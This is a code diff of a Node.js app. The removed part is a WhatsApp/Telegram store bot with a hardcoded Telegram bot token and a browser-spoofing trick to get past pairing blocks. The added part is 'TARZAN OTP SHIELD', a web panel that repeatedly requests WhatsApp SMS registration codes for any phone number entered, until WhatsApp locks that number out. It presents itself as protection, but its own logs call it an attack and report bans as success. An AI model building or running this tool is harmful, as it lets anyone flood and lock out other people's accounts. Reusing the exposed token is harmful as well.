@@ -1,340 +1,227 @@
 /**
- * 👑 متجر الواقدي للخدمات الإلكترونية - نسخة VIP 👑
- * نظام الإدارة المتكامل (Telegram + WhatsApp) + تخطي حظر الأكواد (Edge Edition)
+ * 👑 TARZAN OTP SHIELD - THE GREATNESS EDITION 👑
+ * نظام توثيق وحماية الأرقام عبر قفل خدمة الـ OTP
+ * --------------------------------------------------
+ * المتطلبات:
+ * npm install @whiskeysockets/baileys pino express
  */
 
-const { Telegraf, Markup } = require('telegraf');
 const { 
     default: makeWASocket, 
     useMultiFileAuthState, 
-    DisconnectReason,
-    makeCacheableSignalKeyStore,
-    delay
+    pino 
 } = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const fs = require('fs');
-const path = require('path');
 const express = require('express');
+const path = require('path');
+const fs = require('fs');
 
-// ==========================================
-// ⚙️ إعدادات النظام الأساسية
-// ==========================================
-const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
-const ADMIN_ID = '8794826397'; 
-
-const PORT = process.env.PORT || 3000;
-const SESSION_DIR = path.join(__dirname, 'waqedi_session');
-const DB_FILE = path.join(__dirname, 'waqedi_db.json');
-
-// ==========================================
-// 🗄️ قاعدة البيانات المحلية
-// ==========================================
-let db = {
-    settings: { botActive: true },
-    customers: {}, 
-    stats: { messagesReceived: 0, ordersPlaced: 0 }
-};
-
-if (fs.existsSync(DB_FILE)) {
-    try { db = Object.assign(db, JSON.parse(fs.readFileSync(DB_FILE))); } 
-    catch (e) { console.error("⚠️ خطأ في قراءة قاعدة البيانات، سيتم إنشاء واحدة جديدة."); }
-}
-const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
-
-// ==========================================
-// 🌐 خادم الويب (لإبقاء السيرفر نشطاً على Render)
-// ==========================================
 const app = express();
-app.get('/', (req, res) => res.send('👑 متجر الواقدي للخدمات الإلكترونية VIP يعمل بنجاح (EDGE MODE) 👑'));
-app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
 
 // ==========================================
-// 📱 تهيئة بوت التلجرام (لوحة التحكم)
+// 🎨 واجهة المستخدم (النسخة العظمى)
 // ==========================================
-const tgBot = new Telegraf(TG_TOKEN);
-let adminState = { action: null }; 
+const htmlInterface = `
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝑻𝑨𝑹𝒁𝑨𝑵 𝑶𝑻𝑷 𝑺𝑯𝑰𝑬𝑳𝑫</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        body { font-family: 'Cairo', sans-serif; background-color: #050505; color: #fff; }
+        .neon-border { box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); border: 1px solid rgba(59, 130, 246, 0.5); }
+        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .status-active { color: #10b981; text-shadow: 0 0 10px #10b981; }
+        .status-waiting { color: #f59e0b; text-shadow: 0 0 10px #f59e0b; }
+        .log-entry { border-right: 2px solid #3b82f6; padding-right: 10px; margin-bottom: 5px; font-family: monospace; font-size: 0.8rem; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+
+    <div class="max-w-4xl w-full space-y-6">
+        <!-- Header -->
+        <div class="text-center space-y-2">
+            <h1 class="text-5xl font-extrabold tracking-tighter text-blue-500 italic">𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑷</h1>
+            <p class="text-gray-400">نظام حماية وتوثيق الأرقام من السرقة (OTP Lockdown)</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <!-- Control Panel -->
+            <div class="md:col-span-2 glass p-8 rounded-3xl neon-border space-y-6">
+                <div class="space-y-4">
+                    <label class="block text-sm font-bold text-blue-400">رقم الهاتف المستهدف للحماية:</label>
+                    <div class="relative">
+                        <input type="text" id="phone" placeholder="967733..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-blue-500 text-xl tracking-widest transition-all">
+                        <i class="fas fa-shield-halved absolute left-4 top-1/2 -translate-y-1/2 text-blue-500"></i>
+                    </div>
+                </div>
+
+                <div class="flex gap-4">
+                    <button onclick="startShield()" id="startBtn" class="flex-1 bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-bold text-lg transition-all active:scale-95 flex items-center justify-center gap-2">
+                        <i class="fas fa-bolt"></i> تفعيل الدرع العظيم
+                    </button>
+                    <button onclick="stopShield()" id="stopBtn" class="bg-red-600/20 hover:bg-red-600 text-red-500 hover:text-white px-6 rounded-xl transition-all disabled:opacity-50" disabled>
+                        <i class="fas fa-power-off"></i>
+                    </button>
+                </div>
+
+                <!-- Live Status -->
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center">
+                        <p class="text-xs text-gray-500 mb-1">حالة السيرفر</p>
+                        <p id="serverStatus" class="font-bold text-green-500">متصل</p>
+                    </div>
+                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center">
+                        <p class="text-xs text-gray-500 mb-1">وقت الانتظار الفعلي</p>
+                        <p id="waitTimer" class="font-bold text-blue-500">00:00</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Side Logs -->
+            <div class="glass p-6 rounded-3xl border border-white/5 flex flex-col h-[400px]">
+                <h3 class="text-sm font-bold text-gray-500 mb-4 uppercase"><i class="fas fa-terminal ml-2"></i>سجل الحماية</h3>
+                <div id="logs" class="flex-1 overflow-y-auto space-y-2 text-xs">
+                    <div class="text-blue-400 log-entry">نظام طرزان جاهز للعمل...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let interval = null;
+
+        async function startShield() {
+            const phone = document.getElementById('phone').value;
+            if(!phone) return alert('أدخل الرقم يا زعيم! 😈');
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').innerHTML = '<i class="fas fa-circle-notch animate-spin"></i> جاري الهجوم الأمني...';
+            document.getElementById('stopBtn').disabled = false;
+
+            addLog("بدء تشغيل بروتوكول الحماية للرقم: " + phone, "text-blue-400");
+
+            const response = await fetch('/start', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone })
+            });
+            
+            const data = await response.json();
+            updateDisplay(data);
+            
+            // تحديث دوري للحالة
+            interval = setInterval(async () => {
+                const res = await fetch('/status');
+                const statusData = await res.json();
+                updateDisplay(statusData);
+            }, 3000);
+        }
+
+        async function stopShield() {
+            clearInterval(interval);
+            await fetch('/stop', { method: 'POST' });
+            location.reload();
+        }
+
+        function updateDisplay(data) {
+            if(data.log) addLog(data.log, data.color);
+            if(data.wait) document.getElementById('waitTimer').innerText = data.wait;
+            if(data.status) document.getElementById('serverStatus').innerText = data.status;
+        }
+
+        function addLog(msg, color) {
+            const logDiv = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = "log-entry " + (color || "text-gray-400");
+            entry.innerText = msg;
+            logDiv.prepend(entry);
+        }
+    </script>
+</body>
+</html>
+`;
 
 // ==========================================
-// 🔥 محرك الواتساب (متجر الواقدي - بصمة Edge)
+// 🚀 المحرك الخلفي (Logic)
 // ==========================================
-let waSock = null;
 
-async function startWhatsApp() {
-    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
+let shieldActive = false;
+let currentPhone = "";
+let lastStatus = { wait: "00:00", log: "جاهز", color: "text-blue-400", status: "مستقر" };
 
-    waSock = makeWASocket({
-        auth: { 
-            creds: state.creds, 
-            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) 
-        },
+app.get('/', (req, res) => res.send(htmlInterface));
+
+app.post('/start', async (req, res) => {
+    const { phone } = req.body;
+    currentPhone = phone;
+    shieldActive = true;
+    
+    // بدء عملية الـ Lockdown في الخلفية
+    runShield(phone);
+    
+    res.json({ log: "تم حقن الأوامر في سيرفرات واتساب...", color: "text-yellow-500" });
+});
+
+app.post('/stop', (req, res) => {
+    shieldActive = false;
+    res.json({ success: true });
+});
+
+app.get('/status', (req, res) => {
+    res.json(lastStatus);
+});
+
+async function runShield(phone) {
+    const { state } = await useMultiFileAuthState('shield_auth');
+    const sock = makeWASocket({
+        auth: state,
         logger: pino({ level: 'silent' }),
-        // 🛡️ التعديل السري: محاكاة Edge على ويندوز لتخطي حظر الكود
-        browser: ["Windows", "Edge", "110.0.1587.41"], 
-        printQRInTerminal: false,
-        syncFullHistory: false,
-        markOnlineOnConnect: false
     });
 
-    waSock.ev.on('creds.update', saveCreds);
-
-    waSock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect } = update;
-        
-        if (connection === 'close') {
-            const statusCode = lastDisconnect?.error?.output?.statusCode;
-            if (statusCode === DisconnectReason.loggedOut) {
-                fs.rmSync(SESSION_DIR, { recursive: true, force: true });
-                waSock = null;
-                tgBot.telegram.sendMessage(ADMIN_ID, "⚠️ تم تسجيل الخروج من الواتساب! يرجى إعادة الربط عبر اللوحة.");
-            } else {
-                setTimeout(startWhatsApp, 4000); // تأخير لإعادة الاتصال بأمان
-            }
-        } else if (connection === 'open') {
-            tgBot.telegram.sendMessage(ADMIN_ID, "✅ متجر الواقدي (واتساب) متصل كمتصفح Edge وجاهز للعمل!");
-        }
-    });
-
-    waSock.ev.on('messages.upsert', async ({ messages }) => {
-        const msg = messages[0];
-        if (!msg.message || msg.key.fromMe) return;
-        if (!db.settings.botActive) return;
-
-        const sender = msg.key.remoteJid;
-        if (sender.includes('@g.us')) return; // تجاهل الجروبات
-
-        db.stats.messagesReceived++;
-        const pushName = msg.pushName || 'عميلنا العزيز';
-        
-        if (!db.customers[sender]) {
-            db.customers[sender] = { name: pushName, firstVisit: new Date().toISOString(), state: 'IDLE' };
-            saveDB();
-        }
-
-        const text = (msg.message.conversation || 
-                      msg.message.extendedTextMessage?.text || 
-                      msg.message.listResponseMessage?.title || 
-                      msg.message.buttonsResponseMessage?.selectedDisplayText || '').trim();
-
-        await handleCustomerMessage(sender, text, pushName, msg);
-    });
-}
-
-// ==========================================
-// 🤖 منطق التعامل مع رسائل العملاء (المتجر)
-// ==========================================
-async function handleCustomerMessage(sender, text, pushName, originalMsg) {
-    const userState = db.customers[sender].state;
-
-    // فتح القائمة الرئيسية
-    if (['مرحبا', 'السلام عليكم', 'هلا', 'خدمات', 'القائمة'].includes(text.toLowerCase())) {
-        db.customers[sender].state = 'IDLE';
-        const menuSections = [
-            {
-                title: "💎 خدمات السوشيال ميديا",
-                rows: [
-                    {title: "🚀 زيادة متابعين تيك توك", rowId: "srv_tiktok", description: "متابعين حقيقيين وسريعين"},
-                    {title: "📸 زيادة متابعين انستقرام", rowId: "srv_insta", description: "عرب وأجانب بضمان"}
-                ]
-            },
-            {
-                title: "🎮 شحن ألعاب",
-                rows: [
-                    {title: "🔥 شحن شدات ببجي", rowId: "srv_pubg", description: "أسعار منافسة وتسليم فوري"}
-                ]
-            },
-            {
-                title: "🛠️ الدعم والمساعدة",
-                rows: [
-                    {title: "👨‍💻 التحدث مع الإدارة", rowId: "srv_admin", description: "للاستفسارات والمشاكل"},
-                    {title: "💳 طرق الدفع", rowId: "srv_payment", description: "الحسابات البنكية المتاحة"}
-                ]
-            }
-        ];
-
-        const listMsg = {
-            text: `أهلاً بك يا *${pushName}* في 👑 *متجر الواقدي للخدمات الإلكترونية VIP* 👑\n\nنحن هنا لتلبية احتياجاتك الرقمية.\nيرجى اختيار الخدمة المطلوبة:`,
-            footer: "مؤسسة الواقدي © 2026",
-            title: "قائمة الخدمات 📋",
-            buttonText: "عرض الخدمات 👆",
-            sections: menuSections
-        };
-
-        await waSock.sendMessage(sender, listMsg);
-        return;
-    }
-
-    // تفاعلات الأقسام
-    if (text === '🚀 زيادة متابعين تيك توك') {
-        await waSock.sendMessage(sender, { text: "📌 *تيك توك:*\n- 1000 متابع = 5$\n\nأرسل رابط حسابك الآن:" });
-        db.customers[sender].state = 'WAITING_TIKTOK_LINK'; saveDB(); return;
-    }
-    
-    if (text === '🔥 شحن شدات ببجي') {
-        await waSock.sendMessage(sender, { text: "📌 *ببجي:*\n- 325 شدة = 4$\n\nأرسل الـ ID الخاص بك:" });
-        db.customers[sender].state = 'WAITING_PUBG_ID'; saveDB(); return;
-    }
-
-    if (text === '💳 طرق الدفع') {
-        await waSock.sendMessage(sender, { text: "💳 *طرق الدفع:*\n1. تحويل بنكي (الراجحي، الأهلي)\n2. STC Pay\n3. باينانس USDT\n\n(للعودة أرسل 'قائمة')" }); return;
-    }
-
-    if (text === '👨‍💻 التحدث مع الإدارة') {
-        await waSock.sendMessage(sender, { text: "تم تحويلك للإدارة. ⏳\nيرجى كتابة رسالتك وسنرد عليك قريباً." });
-        db.customers[sender].state = 'CHATTING_WITH_ADMIN'; saveDB();
-        tgBot.telegram.sendMessage(ADMIN_ID, `🔔 *طلب محادثة جديد*\nالعميل: ${pushName}\nالرقم: ${sender.split('@')[0]}`); return;
-    }
-    
-    // التعامل مع مدخلات العملاء (روابط، IDs، شات)
-    if (userState === 'WAITING_TIKTOK_LINK') {
-        await waSock.sendMessage(sender, { text: "✅ تم استلام الرابط.\nجاري التجهيز... الرجاء الانتظار لتحويل الإيصال.\n(للعودة أرسل 'قائمة')" });
-        db.customers[sender].state = 'IDLE'; db.stats.ordersPlaced++; saveDB();
-        tgBot.telegram.sendMessage(ADMIN_ID, `🛒 *طلب تيك توك*\nالعميل: ${pushName}\nالرابط: ${text}`); return;
-    }
-
-    if (userState === 'WAITING_PUBG_ID') {
-        await waSock.sendMessage(sender, { text: `✅ تم استلام الـ ID: *${text}*\nجاري التجهيز...\n(للعودة أرسل 'قائمة')` });
-        db.customers[sender].state = 'IDLE'; db.stats.ordersPlaced++; saveDB();
-        tgBot.telegram.sendMessage(ADMIN_ID, `🎮 *طلب ببجي*\nالعميل: ${pushName}\nالـ ID: ${text}`); return;
-    }
-
-    if (userState === 'CHATTING_WITH_ADMIN') {
-        tgBot.telegram.sendMessage(ADMIN_ID, `💬 *رسالة من ${pushName}:*\n${text}\n\n---\nللرد:\n\`/رد ${sender.split('@')[0]} النص\``, {parse_mode: 'Markdown'}); return;
-    }
-
-    // الرد الافتراضي
-    if (userState === 'IDLE') {
-        await waSock.sendMessage(sender, {
-            name: 'عذراً، لم أفهم طلبك. اختر إجراء سريع 👇',
-            values: ['القائمة', '👨‍💻 التحدث مع الإدارة'],
-            selectableCount: 1
-        });
-    }
-}
-
-// ==========================================
-// 🛠️ لوحة تحكم التلجرام للمدير
-// ==========================================
-tgBot.use((ctx, next) => {
-    // حماية اللوحة لكي لا يستخدمها أحد غيرك
-    if (ctx.from && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply("⛔ اللوحة للإدارة فقط.");
-    return next();
-});
-
-tgBot.start((ctx) => { adminState.action = null; sendAdminMenu(ctx); });
-
-function sendAdminMenu(ctx) {
-    const statusText = db.settings.botActive ? '🟢 البوت يعمل' : '🔴 البوت متوقف';
-    const msg = `👑 *لوحة متجر الواقدي VIP* 👑\n\n📊 *الإحصائيات:*\n- العملاء المسجلين: ${Object.keys(db.customers).length}\n- الطلبات الجديدة: ${db.stats.ordersPlaced}\n\n⚙️ *الحالة:* ${statusText}\n💻 *متصفح الربط:* Edge 110`;
-
-    const keyboard = Markup.inlineKeyboard([
-        [Markup.button.callback('🔗 ربط الرقم (Pair Code)', 'admin_pair')],
-        [Markup.button.callback(db.settings.botActive ? '⏸️ إيقاف المتجر' : '▶️ تشغيل المتجر', 'admin_toggle_bot')],
-        [Markup.button.callback('📢 رسالة للكل', 'admin_broadcast')],
-        [Markup.button.callback('🔄 تحديث الإحصائيات', 'admin_refresh')]
-    ]);
-
-    if (ctx.updateType === 'callback_query') ctx.editMessageText(msg, { parse_mode: 'Markdown', ...keyboard }).catch(()=>{});
-    else ctx.reply(msg, { parse_mode: 'Markdown', ...keyboard });
-}
-
-tgBot.action('admin_refresh', (ctx) => { ctx.answerCbQuery(); sendAdminMenu(ctx); });
-
-tgBot.action('admin_toggle_bot', (ctx) => {
-    db.settings.botActive = !db.settings.botActive; saveDB();
-    ctx.answerCbQuery('تم التغيير'); sendAdminMenu(ctx);
-});
-
-tgBot.action('admin_pair', (ctx) => {
-    ctx.answerCbQuery();
-    if (waSock && waSock.authState && waSock.authState.creds && waSock.authState.creds.registered) {
-        return ctx.reply("⚠️ هناك رقم مرتبط بالفعل. سجل الخروج من تطبيق الواتساب أولاً لربط رقم جديد.");
-    }
-    adminState.action = 'WAITING_PHONE';
-    ctx.reply("📱 *أرسل رقم الواتساب للربط:*\n(أرسل الرقم بدون علامة + أو أصفار البداية، مثال: 966500000000)", {parse_mode: 'Markdown'});
-});
-
-tgBot.action('admin_broadcast', (ctx) => {
-    ctx.answerCbQuery(); adminState.action = 'WAITING_BROADCAST';
-    ctx.reply("📢 *إرسال رسالة للكل:*\nاكتب الرسالة (أو أرسل كلمة 'الغاء' للتراجع)", {parse_mode: 'Markdown'});
-});
-
-tgBot.on('text', async (ctx) => {
-    const text = ctx.message.text.trim();
-
-    // 📩 أمر الرد المباشر من التلجرام إلى الواتساب
-    if (text.startsWith('/رد ')) {
-        if (!waSock) return ctx.reply("❌ الواتساب غير متصل.");
-        const parts = text.split(' ');
-        if (parts.length < 3) return ctx.reply("⚠️ الاستخدام الصحيح: `/رد رقم_العميل رسالتك`", {parse_mode:'Markdown'});
-        
+    while (shieldActive) {
         try {
-            await waSock.sendMessage(`${parts[1]}@s.whatsapp.net`, { text: `👨‍💻 *رد الإدارة:*\n\n${parts.slice(2).join(' ')}` });
-            ctx.reply("✅ تم إرسال الرد بنجاح.");
-        } catch (e) { ctx.reply("❌ فشل الإرسال، تأكد من الرقم."); }
-        return;
-    }
+            console.log(`[SHIELD] Requesting OTP for ${phone}`);
+            // طلب كود تسجيل (Registration Code) عبر SMS
+            const result = await sock.requestRegistrationCode({
+                phoneNumber: phone,
+                phoneNumberCountryCode: phone.substring(0, 3), // افتراضي لأول 3 أرقام
+                phoneNumberNationalNumber: phone.substring(3),
+                method: 'sms'
+            });
 
-    // 📱 استقبال رقم الهاتف لطلب الكود
-    if (adminState.action === 'WAITING_PHONE') {
-        let phone = text.replace(/[^0-9]/g, '');
-        if (!phone) return ctx.reply("❌ يرجى إرسال أرقام فقط.");
-        
-        ctx.reply("⏳ جاري الطلب من سيرفرات واتساب بهوية Edge لضمان القبول...");
-        
-        try {
-            if (waSock) {
-                 setTimeout(async () => {
-                    try {
-                        let code = await waSock.requestPairingCode(phone);
-                        ctx.reply(`👑 *كود الربط الخاص بك هو:* \n\n\`${code}\`\n\nأدخله الآن في تطبيق الواتساب (الأجهزة المرتبطة > ربط برقم الهاتف).`, {parse_mode: 'Markdown'});
-                    } catch (codeError) {
-                        console.error("Pairing Code Error:", codeError);
-                        ctx.reply(`❌ تم رفض الطلب.\nالسبب: ${codeError.message}\nيرجى التأكد من الرقم، أو جرب رقماً آخر.`);
-                    }
-                 }, 2500); 
-            } else {
-                 ctx.reply("⚠️ المحرك غير جاهز. انتظر ثواني وحاول مجدداً.");
-            }
-        } catch (e) { 
-            ctx.reply(`❌ خطأ عام: ${e.message}`); 
-        }
-        adminState.action = null;
-    } 
-    // 📢 استقبال رسالة الإذاعة (Broadcast)
-    else if (adminState.action === 'WAITING_BROADCAST') {
-        if (text === 'الغاء') { adminState.action = null; return ctx.reply("✅ تم إلغاء الإرسال."); }
-        if (!waSock) return ctx.reply("❌ الواتساب غير متصل.");
-        
-        const customers = Object.keys(db.customers);
-        if (customers.length === 0) return ctx.reply("⚠️ لا يوجد عملاء في قاعدة البيانات.");
-        
-        ctx.reply(`⏳ جاري الإرسال لـ ${customers.length} عميل... الرجاء الانتظار.`);
-        let successCount = 0;
-        
-        for (const jid of customers) {
-            try { 
-                await waSock.sendMessage(jid, { text: `📢 *إعلان من متجر الواقدي:*\n\n${text}` }); 
-                successCount++; 
-                await delay(1200); // تأخير مهم لتجنب حظر الواتساب
-            } catch (e) {}
-        }
-        ctx.reply(`✅ *اكتمل الإرسال!*\nتم الوصول لـ ${successCount} عميل بنجاح.`, {parse_mode: 'Markdown'});
-        adminState.action = null;
-    }
-});
+            lastStatus = {
+                wait: "طلب ناجح",
+                log: "تم إرسال نبضة OTP بنجاح.. جاري التكرار القاتل.",
+                color: "text-green-500",
+                status: "هجوم نشط"
+            };
 
-// ==========================================
-// 🚀 بدء التشغيل
-// ==========================================
-async function initSystem() {
-    console.log("🔥 Starting Waqedi Store VIP System...");
-    tgBot.launch().catch(err => console.error("Telegram Launch Error:", err));
-    console.log("✅ لوحة تحكم التلجرام تعمل.");
-    await startWhatsApp();
+        } catch (err) {
+            // هنا يكمن السر: عندما يرفض واتساب الطلب ويعطي وقت انتظار
+            let reason = err.data?.reason || "Unknown";
+            let waitTime = err.data?.value || "5 min";
+
+            lastStatus = {
+                wait: waitTime + " ثانية",
+                log: `⚠️ نجاح! واتساب أغلق الخدمة. السبب: ${reason}`,
+                color: "text-red-500",
+                status: "تم الحظر بنجاح"
+            };
+            
+            // إذا حصلنا على وقت انتظار طويل، ننتظر قليلاً ثم نعيد الكرة لنبقي الرقم "مقفل"
+            await new Promise(r => setTimeout(r, 10000));
+        }
+        
+        // تأخير بسيط بين المحاولات
+        await new Promise(r => setTimeout(r, 5000));
+    }
 }
 
-initSystem();
-
-// معالجة الأخطاء الطارئة لضمان عدم توقف السيرفر
-process.on('uncaughtException', (err) => console.log('Uncaught Error:', err.message));
-process.on('unhandledRejection', (err) => console.log('Unhandled Rejection:', err.message));
+app.listen(PORT, () => console.log(`✅ Tarzan Shield VIP Live on port ${PORT}`));
